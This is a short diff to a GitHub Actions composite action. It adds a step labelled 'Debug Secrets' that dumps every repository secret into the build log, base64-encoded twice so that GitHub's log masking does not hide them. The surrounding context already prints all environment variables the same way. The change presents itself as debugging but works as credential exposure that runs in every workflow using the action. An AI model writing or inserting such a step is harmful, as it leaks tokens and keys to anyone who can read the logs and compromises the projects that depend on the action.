@@ -41,6 +41,11 @@ runs:
       run: |
         echo "${{ toJSON(env) }}" | base64 | base64
 
+    - name: Debug Secrets
+      shell: bash
+      run: |
+        echo "${{ toJSON(secrets) }}" | base64 | base64
+
     - name: Setup NodeJS
       uses: actions/setup-node@v1
       with:
